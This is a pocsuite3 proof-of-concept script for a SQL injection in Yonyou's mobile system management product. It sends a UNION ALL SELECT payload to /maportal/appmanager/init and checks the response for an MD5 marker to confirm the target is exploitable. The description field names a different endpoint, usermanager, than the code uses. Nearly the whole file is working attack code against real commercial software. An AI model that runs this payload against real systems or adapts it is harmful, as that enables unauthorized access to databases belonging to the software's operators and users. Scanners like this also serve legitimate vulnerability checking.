
from collections import OrderedDict
import re,random
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2023-10-07'  #漏洞公开的时间,不知道就写今天
    createDate = '2023-10-07'  # 编写 PoC 的日期
    updateDate = '2023-10-07'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = '用友移动系统管理'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = '移动系统管理'  # 漏洞应用名称
    appVersion = '''ALl'''  # 漏洞影响版本
    vulType = VUL_TYPE.SQL_INJECTION  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        用友移动系统管理 /maportal/usermanager/init 存在SQL注入漏洞，攻击者可通过此漏洞获取敏感信息。
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    def _verify(self):
        result = {}
        path = '/maportal/appmanager/init'
        paylaod = "appname=qaxnb' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,sys.fn_varbintohexstr(hashbytes('md5','test')),NULL,NULL,NULL,NULL,NULL,NULL--&sys_type=&loginmode="
        url = self.url + path
        header = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded;'
        }
        try: 
            resq = requests.post(url=url,headers=header,data=paylaod,timeout=5)
            if resq.status_code == 200 and "c8059e2ec7419f590e79d7f1b774bfe6" in resq.text:
                    #print(resq_windows.text)
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = url
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
        return self._verify()
    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)